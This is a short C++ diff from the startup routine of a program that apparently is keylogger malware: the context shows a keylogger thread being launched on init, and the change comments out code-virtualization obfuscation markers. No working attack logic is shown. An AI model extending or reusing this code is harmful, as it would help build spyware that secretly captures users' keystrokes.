@@ -21,7 +21,7 @@ LPTSTR General::lpArguments;
 
 bool General::init() // startup of program
 {
-  VL_VIRTUALIZATION_BEGIN;
+  /*VL_VIRTUALIZATION_BEGIN;*/
   // VARIABLE SETUP
   currentPath = getCurrentPath();
   installFolder = getInstallFolder();
@@ -65,7 +65,7 @@ bool General::init() // startup of program
     Keylogger.detach();
   }
 
-  VL_VIRTUALIZATION_END;
+  /*VL_VIRTUALIZATION_END;*/
   return installing;
 }
 
